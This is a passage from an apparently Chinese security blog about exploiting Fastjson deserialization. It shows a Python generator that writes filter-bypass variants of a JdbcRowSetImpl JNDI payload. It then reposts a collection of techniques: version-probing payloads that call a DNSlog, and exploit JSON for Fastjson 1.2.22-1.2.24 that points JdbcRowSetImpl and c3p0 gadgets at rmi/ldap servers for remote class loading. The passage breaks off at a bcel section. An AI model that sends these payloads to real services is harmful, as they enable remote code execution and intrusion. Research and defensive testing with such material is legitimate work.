plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># 对@type的value增加LL开头，;;结尾的payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_payload2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_common</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;LL&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;;;&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># 对@type的value进行\u</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_payload3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_common</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               </span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\\u{:04x}&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> c </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\\\\&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;\\&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># 对@type的value进行\x</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_payload4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_common</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               </span><span class="token keyword" style="color:#00009f">lambda</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;\\x{:02x}&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> c </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">encode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;\\\\&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;\\&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># 生成cache绕过payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen_payload5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token builtin">str</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cache_payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&quot;rand1&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token string" style="color:#e3116c">&quot;@type&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;java.lang.Class&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token string" style="color:#e3116c">&quot;val&quot;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        cache_payload</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;rand2&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loads</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> json</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dumps</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cache_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">gen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payloads </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload1 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload1</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> payload1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload2 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload2</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> payload2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload3 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> payload3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload4 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> payload4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload5 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload5</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">base_payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> payload5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payloads</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payloads</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payloads</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">append</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> payload </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> payloads</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload3</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">yield</span><span class="token plain"> self</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen_payload4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> __name__ </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;__main__&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fjp </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> FastJsonPayload</span><span class="token punctuation" style="color:#393A34">(</span><span class="token triple-quoted-string string" style="color:#e3116c">&#x27;&#x27;&#x27;{</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">  &quot;rand1&quot;: {</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &quot;dataSourceName&quot;: &quot;ldap://localhost:1389/Object&quot;,</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">    &quot;autoCommit&quot;: true</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">}&#x27;&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> payload </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> fjp</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">gen</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211019155056660" src="/assets/images/image-20211019155056660-fc172eeffd69c1df20ce76720f5ac1a5.png" width="3582" height="1434" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fastjson姿势技巧集合">Fastjson姿势技巧集合<a href="#fastjson姿势技巧集合" class="hash-link" aria-label="Fastjson姿势技巧集合的直接链接" title="Fastjson姿势技巧集合的直接链接">​</a></h2>
<blockquote>
<p><a href="https://github.com/safe6Sec/Fastjson" target="_blank" rel="noopener noreferrer">https://github.com/safe6Sec/Fastjson</a></p>
</blockquote>
<p>做个备份，怕删了</p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token title important punctuation" style="color:#393A34">#</span><span class="token title important"> Fastjson</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Fastjson姿势技巧集合</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> 说明</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2021.8.10 小弟水平有限，1.2.48之后高版本漏洞成因还未进行研究探索，很多利用细节和注意事项都不够完整，待我有空慢慢补充。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> 探测</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">用来探测目标版本，才能更好确定使用的payload。还可以用来区分fastjson和Jackjson。   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fastjson探测版本，还可以用错误格式的json发过去。如果对方异常未处理可报出详细版本。   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">主要是利用各个类被加入黑名单的方式进行判断</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fastjson &gt;1.2.43</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fastjson &gt;1.2.48</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fastjson &gt;1.2.68</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://dnslog&quot;}}&quot;&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}]</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}</span><br></span><span class="token-line" style="color:#393A34"><span class="token code code-block language-java">{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;}:0</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> 各版本利用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">除了考虑Fastjson版本，还得考虑JDK版本，中间件版本，第三方依赖版本。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JDK版本对于JDNI注入的限制，基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191。（更高版本也有绕过）  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">更高版本绕过可用https://github.com/veracode-research/rogue-jndi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> jndi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> JdbcRowSetImpl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> C3p0#JndiRefForwardingDataSource</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> JndiDataSourceFactory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> bcel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> tomcat#dbcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> ibatis</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> TemplatesImpl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token hr punctuation" style="color:#393A34">----</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">###</span><span class="token title important"> Fastjson 1.2.22-1.2.24</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">####</span><span class="token title important"> JdbcRowSetImpl</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/badClassName&quot;, &quot;autoCommit&quot;:true}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">####</span><span class="token title important"> c3p0#JndiRefForwardingDataSource</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">JdbcRowSetImpl无法成功可以一试</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token code code-language">java</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code code-block language-java">{&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;rmi://127.0.0.1:1099/badClassName&quot;, &quot;loginTimeout&quot;:0}</span><span class="token code"></span><br></span><span class="token-line" style="color:#393A34"><span class="token code"></span><span class="token code punctuation" style="color:#393A34">```</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token title important punctuation" style="color:#393A34">####</span><span class="token title important"> bcel</span><span class="token plain"></span><br></span><span class="token-line" 